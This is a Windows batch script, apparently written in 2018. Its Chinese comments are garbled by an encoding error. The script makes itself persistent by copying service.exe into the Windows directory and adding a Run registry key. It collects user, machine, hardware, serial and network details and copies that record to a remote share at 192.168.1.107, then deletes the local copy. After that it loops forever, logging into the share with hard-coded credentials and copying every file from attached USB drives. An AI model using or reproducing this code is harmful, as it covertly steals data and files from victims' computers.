rem made by zhoushoujian on 2018/10/28
@echo off
rem ȷ���Է�������ͬһ���������²��ҹر��Լ��ķ���ǽ
mode con cols=90
ver
color 0A
echo %date% %time%

rem ��������������Ŀ¼�����ÿ�����������ֹ�û��ֶ�ɾ������ļ�
copy %~dp0\service.exe %windir%\service.exe
REG ADD HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run /v service /t REG_SZ /d "%windir%\service.exe" /f

title ���ڻ�ȡ�������������Ϣ
echo  ���ڻ�ȡ�������������Ϣ

rem �����⼦�ĵ��Ա��沢�������Լ�
for /f "tokens=4" %%a in ('route print^|findstr 0.0.0.0.*0.0.0.0') do (
     set IP=%%a
)

rem ���Ե�����̨
echo ip: %IP% 
echo ��¼����%USERNAME%
echo ���������%COMPUTERNAME%
for /f "tokens=2 delims==" %%a in ('wmic cpu get Name /value ^| findstr /i "Name"') do echo ��������%%~a
for /f "tokens=2 delims==" %%a in ('wmic memorychip get Capacity /value ^| findstr /i "Capacity"') do echo �ڴ�������%%~a
for /f "tokens=2 delims==" %%a in ('wmic DiskDrive get Size /value ^| findstr /i "Size"') do echo Ӳ��������%%~a
for /f "tokens=2 delims==" %%a in ('wmic csproduct get IdentifyingNumber /value ^| findstr /i "IdentifyingNumber"') do echo SN���кţ�%%~a
for /f "tokens=2 delims==" %%a in ('wmic csproduct get Name /value ^| findstr /i "Name"') do echo �����ͺţ�%%~a
for /f "tokens=2 delims==" %%a in ('wmic csproduct get Vendor /value ^| findstr /i "Vendor"') do echo �����̣�%%~a

rem ��ӡ����־
echo time: %date% %time% >> %userprofile%\%IP%_%DATE:~5,2%_%DATE:~8,2%_%time:~0,2%_%time:~3,2%_brief
echo ip: %IP% >> %userprofile%\%IP%_%DATE:~5,2%_%DATE:~8,2%_%time:~0,2%_%time:~3,2%_brief
echo ��¼����%USERNAME% >> %userprofile%\%IP%_%DATE:~5,2%_%DATE:~8,2%_%time:~0,2%_%time:~3,2%_brief
echo ���������%COMPUTERNAME% >> %userprofile%\%IP%_%DATE:~5,2%_%DATE:~8,2%_%time:~0,2%_%time:~3,2%_brief
for /f "tokens=2 delims==" %%a in ('wmic cpu get Name /value ^| findstr /i "Name"') do echo ��������%%~a >> %userprofile%\%IP%_%DATE:~5,2%_%DATE:~8,2%_%time:~0,2%_%time:~3,2%_brief
for /f "tokens=2 delims==" %%a in ('wmic memorychip get Capacity /value ^| findstr /i "Capacity"') do echo �ڴ�������%%~a >> %userprofile%\%IP%_%DATE:~5,2%_%DATE:~8,2%_%time:~0,2%_%time:~3,2%_brief
for /f "tokens=2 delims==" %%a in ('wmic DiskDrive get Size /value ^| findstr /i "Size"') do echo Ӳ��������%%~a >> %userprofile%\%IP%_%DATE:~5,2%_%DATE:~8,2%_%time:~0,2%_%time:~3,2%_brief
for /f "tokens=2 delims==" %%a in ('wmic csproduct get IdentifyingNumber /value ^| findstr /i "IdentifyingNumber"') do echo SN���кţ�%%~a >> %userprofile%\%IP%_%DATE:~5,2%_%DATE:~8,2%_%time:~0,2%_%time:~3,2%_brief
for /f "tokens=2 delims==" %%a in ('wmic csproduct get Name /value ^| findstr /i "Name"') do echo �����ͺţ�%%~a >> %userprofile%\%IP%_%DATE:~5,2%_%DATE:~8,2%_%time:~0,2%_%time:~3,2%_brief
for /f "tokens=2 delims==" %%a in ('wmic csproduct get Vendor /value ^| findstr /i "Vendor"') do echo �����̣�%%~a >> %userprofile%\%IP%_%DATE:~5,2%_%DATE:~8,2%_%time:~0,2%_%time:~3,2%_brief

sc config  winmgmt start= auto >nul 2<&1
net start winmgmt 2>nul
setlocal  ENABLEDELAYEDEXPANSION
echo ����:
for /f "tokens=1,* delims==" %%a in ('wmic BASEBOARD get Manufacturer^,Product^,Version^,SerialNumber /value') do (
     set /a tee+=1
     if "!tee!" == "3" echo       ������   = %%b >> %userprofile%\%IP%_%DATE:~5,2%_%DATE:~8,2%_%time:~0,2%_%time:~3,2%_brief && echo       ������   = %%b
     if "!tee!" == "4" echo       ��  ��   = %%b >> %userprofile%\%IP%_%DATE:~5,2%_%DATE:~8,2%_%time:~0,2%_%time:~3,2%_brief&& echo       ��  ��   = %%b
     if "!tee!" == "5" echo       ���к�   = %%b >> %userprofile%\%IP%_%DATE:~5,2%_%DATE:~8,2%_%time:~0,2%_%time:~3,2%_brief&& echo       ���к�   = %%b
     if "!tee!" == "6" echo       ��  ��   = %%b >> %userprofile%\%IP%_%DATE:~5,2%_%DATE:~8,2%_%time:~0,2%_%time:~3,2%_brief&& echo       ��  ��   = %%b
)
set tee=0
echo      BIOS:
for /f "tokens=1,* delims==" %%a in ('wmic bios  get 

CurrentLanguage^,Manufacturer^,SMBIOSBIOSVersion^,SMBIOSMajorVersion^,SMBIOSMinorVersion^,ReleaseDate /value') do (
     set /a tee+=1
     if "!tee!" == "3" echo       ��ǰ���� = %%b >> %userprofile%\%IP%_%DATE:~5,2%_%DATE:~8,2%_%time:~0,2%_%time:~3,2%_brief&& echo       ��ǰ���� = %%b
     if "!tee!" == "4" echo       ������   = %%b >> %userprofile%\%IP%_%DATE:~5,2%_%DATE:~8,2%_%time:~0,2%_%time:~3,2%_brief&& echo       ������   = %%b 
     if "!tee!" == "5" echo       �������� = %%b >> %userprofile%\%IP%_%DATE:~5,2%_%DATE:~8,2%_%time:~0,2%_%time:~3,2%_brief echo       �������� = %%b 
     if "!tee!" == "6" echo       ��  ��   = %%b >> %userprofile%\%IP%_%DATE:~5,2%_%DATE:~8,2%_%time:~0,2%_%time:~3,2%_brief&& echo       ��  ��   = %%b
     if "!tee!" == "7" echo       SMBIOSMajorVersion = %%b >> %userprofile%\%IP%_%DATE:~5,2%_%DATE:~8,2%_%time:~0,2%_%time:~3,2%_brief&& echo       SMBIOSMajorVersion = %%b 
     if "!tee!" == "8" echo       SMBIOSMinorVersion = %%b >> %userprofile%\%IP%_%DATE:~5,2%_%DATE:~8,2%_%time:~0,2%_%time:~3,2%_brief&& echo       SMBIOSMinorVersion = %%b
)
set tee=0
echo.
echo CPU:
for /f "tokens=1,* delims==" %%a in ('wmic cpu get name^,ExtClock^,CpuStatus^,Description /value') do (
     set /a tee+=1
     if "!tee!" == "3" echo       CPU����   = %%b >> %userprofile%\%IP%_%DATE:~5,2%_%DATE:~8,2%_%time:~0,2%_%time:~3,2%_brief&& echo       CPU����   = %%b 
     if "!tee!" == "4" echo       �������汾   = %%b >> %userprofile%\%IP%_%DATE:~5,2%_%DATE:~8,2%_%time:~0,2%_%time:~3,2%_brief&& echo       �������汾   = %%b 
     if "!tee!" == "5" echo       ��   Ƶ   = %%b >> %userprofile%\%IP%_%DATE:~5,2%_%DATE:~8,2%_%time:~0,2%_%time:~3,2%_brief&&  echo       ��   Ƶ   = %%b
     if "!tee!" == "6" echo       ���Ƽ���Ƶ��   = %%b >> %userprofile%\%IP%_%DATE:~5,2%_%DATE:~8,2%_%time:~0,2%_%time:~3,2%_brief&& echo       ���Ƽ���Ƶ��   = %%b
)
set tee=0
echo.
echo ��ʾ��:
for /f "tokens=1,* delims==" %%a in ('wmic DESKTOPMONITOR  get name^,ScreenWidth^,ScreenHeight^,PNPDeviceID /value') do (
     set /a tee+=1
     if "!tee!" == "3" echo       ��    ��  = %%b >> %userprofile%\%IP%_%DATE:~5,2%_%DATE:~8,2%_%time:~0,2%_%time:~3,2%_brief&& echo       ��    ��  = %%b 
     if "!tee!" == "4" echo       ������Ϣ  = %%b >> %userprofile%\%IP%_%DATE:~5,2%_%DATE:~8,2%_%time:~0,2%_%time:~3,2%_brief&& echo       ������Ϣ  = %%b
     if "!tee!" == "5" echo       ��Ļ��    = %%b >> %userprofile%\%IP%_%DATE:~5,2%_%DATE:~8,2%_%time:~0,2%_%time:~3,2%_brief&& echo       ��Ļ��    = %%b
     if "!tee!" == "6" echo       ��Ļ��    = %%b >> %userprofile%\%IP%_%DATE:~5,2%_%DATE:~8,2%_%time:~0,2%_%time:~3,2%_brief&& echo       ��Ļ��    = %%b
)
set tee=0
echo.
echo Ӳ  ��:
for /f "tokens=1,* delims==" %%a in ('wmic DISKDRIVE get model^,interfacetype^,size^,totalsectors^,partitions /value') do (
     set /a tee+=1
     if "!tee!" == "3" echo       �ӿ�����  = %%b >> %userprofile%\%IP%_%DATE:~5,2%_%DATE:~8,2%_%time:~0,2%_%time:~3,2%_brief&& echo       �ӿ�����  = %%b 
     if "!tee!" == "4" echo       Ӳ���ͺ�  = %%b >> %userprofile%\%IP%_%DATE:~5,2%_%DATE:~8,2%_%time:~0,2%_%time:~3,2%_brief&& echo       Ӳ���ͺ�  = %%b
     if "!tee!" == "5" echo       ������    = %%b >> %userprofile%\%IP%_%DATE:~5,2%_%DATE:~8,2%_%time:~0,2%_%time:~3,2%_brief&& echo       ������    = %%b
     if "!tee!" == "6" echo       ��    ��  = %%b >> %userprofile%\%IP%_%DATE:~5,2%_%DATE:~8,2%_%time:~0,2%_%time:~3,2%_brief&& echo       ��    ��  = %%b
     if "!tee!" == "7" echo       ������    = %%b >> %userprofile%\%IP%_%DATE:~5,2%_%DATE:~8,2%_%time:~0,2%_%time:~3,2%_brief&& echo       ������    = %%b 
)
echo ������Ϣ:
wmic LOGICALDISK  where mediatype='12' get description,deviceid,filesystem,size,freespace
set tee=0
echo.
echo ��  ��:
for /f "tokens=1,* delims==" %%a in ('wmic NICCONFIG where "index='1'" get ipaddress^,macaddress^,description /value') do (
     set /a tee+=1
     if "!tee!" == "3" echo       ��������  = %%b >> %userprofile%\%IP%_%DATE:~5,2%_%DATE:~8,2%_%time:~0,2%_%time:~3,2%_brief && echo       ��������  = %%b
     if "!tee!" == "4" echo       ����IP    = %%b >> %userprofile%\%IP%_%DATE:~5,2%_%DATE:~8,2%_%time:~0,2%_%time:~3,2%_brief && echo       ����IP    = %%b
     if "!tee!" == "5" echo       ����MAC   = %%b >> %userprofile%\%IP%_%DATE:~5,2%_%DATE:~8,2%_%time:~0,2%_%time:~3,2%_brief && echo       ����MAC   = %%b 
)
set tee=0
echo.
echo ��ӡ��:
for /f "tokens=1,* delims==" %%a in ('wmic PRINTER get caption /value') do (
     set /a tee+=1
     if "!tee!" == "3" echo       ��ӡ������  = %%b >> %userprofile%\%IP%_%DATE:~5,2%_%DATE:~8,2%_%time:~0,2%_%time:~3,2%_brief && echo       ��ӡ������  = %%b
)

echo. >> %userprofile%\%IP%_%DATE:~5,2%_%DATE:~8,2%_%time:~0,2%_%time:~3,2%_brief
echo. >> %userprofile%\%IP%_%DATE:~5,2%_%DATE:~8,2%_%time:~0,2%_%time:~3,2%_brief
echo. >> %userprofile%\%IP%_%DATE:~5,2%_%DATE:~8,2%_%time:~0,2%_%time:~3,2%_brief
echo. >> %userprofile%\%IP%_%DATE:~5,2%_%DATE:~8,2%_%time:~0,2%_%time:~3,2%_brief
echo. >> %userprofile%\%IP%_%DATE:~5,2%_%DATE:~8,2%_%time:~0,2%_%time:~3,2%_brief
echo. >> %userprofile%\%IP%_%DATE:~5,2%_%DATE:~8,2%_%time:~0,2%_%time:~3,2%_brief
echo. >> %userprofile%\%IP%_%DATE:~5,2%_%DATE:~8,2%_%time:~0,2%_%time:~3,2%_brief

rem ���͵���������Ϣ
xcopy %userprofile%\%IP%_%DATE:~5,2%_%DATE:~8,2%_%time:~0,2%_%time:~3,2%_brief \\192.168.1.107\\C$\\test /D /Y /K
del /f /q  %userprofile%\%IP%_%DATE:~5,2%_%DATE:~8,2%_%time:~0,2%_%time:~3,2%_brief 

:working
title ���������Լ��ĵ���
echo  ���������Լ��ĵ���
rem �����Լ��ĵ���
net use \\192.168.1.107\ipc$ "789" /user:zhou

title ���ڻ�ȡu������
echo  ���ڻ�ȡu������
rem ��ȡu���̷�
for /f "tokens=2 delims==" %%a in ('wmic LogicalDisk where "DriveType='2'" get DeviceID /value') do ( set DriveU=%%a )
echo u���̷�Ϊ %DriveU%

rem ����u������ļ�
for /R %DriveU% %%b in (*.*) do (xcopy  %%b \\192.168.1.107\\C$\\test /D /Y /K)

goto working

title �ļ���ȫ��������ϣ�����
echo  �ļ���ȫ��������ϣ�����


